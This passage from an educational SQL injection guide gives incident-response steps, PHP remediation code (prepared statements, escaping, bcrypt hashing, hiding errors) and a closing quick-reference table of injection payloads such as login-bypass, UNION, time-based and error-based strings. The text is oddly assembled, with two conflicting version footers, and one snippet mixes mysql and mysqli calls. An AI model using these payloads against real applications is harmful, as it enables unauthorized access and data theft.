3. **Forensic analysis** - Determine scope of compromise
4. **Customer notification** - If data breach confirmed (legal requirement in many jurisdictions)

### Long-Term Actions (Within 1 Week):

1. **Complete security audit** - Test entire application
2. **Implement monitoring** - Deploy IDS/IPS for SQL injection
3. **Developer training** - Security awareness program
4. **Update SDLC** - Include security in code review process

---

**Document Version**: 2.0 - Complete Edition  
**Last Updated**: February 13, 2026  
**Classification**: Educational Security Research  
**Author**: Security Training Material

---

_"The best defense is knowledge. The best offense is prevention."_

**Build secure. Code safe. Test often.**

### 1. Use Prepared Statements (Parameterized Queries)

```php
// SECURE VERSION
$stmt = $connection->prepare("SELECT name, password FROM users WHERE name = ? AND password = ? LIMIT 0,1");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

### 2. Input Validation and Sanitization

```php
// Escape special characters
$username = mysqli_real_escape_string($connection, $_POST['username']);
$password = mysqli_real_escape_string($connection, $_POST['password']);

// Validate input format
if (!preg_match("/^[a-zA-Z0-9_]+$/", $username)) {
    die("Invalid username format");
}
```

### 3. Use Password Hashing

```php
// NEVER store plaintext passwords
// Hash on registration
$hashed_password = password_hash($password, PASSWORD_BCRYPT);

// Verify on login
if (password_verify($input_password, $stored_hash)) {
    // Authentication successful
}
```

### 4. Implement Least Privilege Principle

- Database user should only have SELECT permissions on necessary tables
- Never use root or admin accounts for application database connections

### 5. Error Handling

```php
// DON'T reveal database errors to users
if (!$result) {
    error_log("Database error: " . mysql_error($connection));
    die("An error occurred. Please try again later.");
}
```

### 6. Web Application Firewall (WAF)

- Deploy ModSecurity or similar WAF
- Configure rules to detect SQL injection patterns
- Block suspicious requests before they reach the application

---

## 📚 Additional Resources

### OWASP References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10 - A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)

### Testing Tools

- **SQLMap**: Automated SQL injection testing tool
- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Free security scanner

---

## ⚠️ Legal Disclaimer

**IMPORTANT**: The techniques described in this document are for **educational purposes only**.

- Only test on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal in most jurisdictions
- Use this knowledge to build secure applications and improve defensive security

---

## 🎓 Summary

SQL injection remains one of the most critical web application vulnerabilities. Key takeaways:

1. **Never trust user input** - Always validate and sanitize
2. **Use parameterized queries** - Prepared statements prevent SQL injection
3. **Hash passwords** - Never store or display plaintext passwords
4. **Minimize information leakage** - Don't expose database errors
5. **Apply principle of least privilege** - Limit database user permissions
6. **Regular security testing** - Continuously test for vulnerabilities

### Quick Reference: Common Injection Patterns

|Pattern|Example|Purpose|
|---|---|---|
|Comment injection|`admin'--`|Bypass password check|
|OR injection|`' OR '1'='1`|Always true condition|
|UNION injection|`' UNION SELECT ...`|Extract additional data|
|Time-based blind|`' AND SLEEP(5)--`|Infer data via delays|
|Error-based|`' AND 1=CONVERT(int, @@version)--`|Extract data via errors|

---

**Document Version**: 1.0  
**Last Updated**: February 2026  
**Classification**: Educational Security Research

---

_Remember: Good security practices protect both users and developers. Build secure applications from the ground up._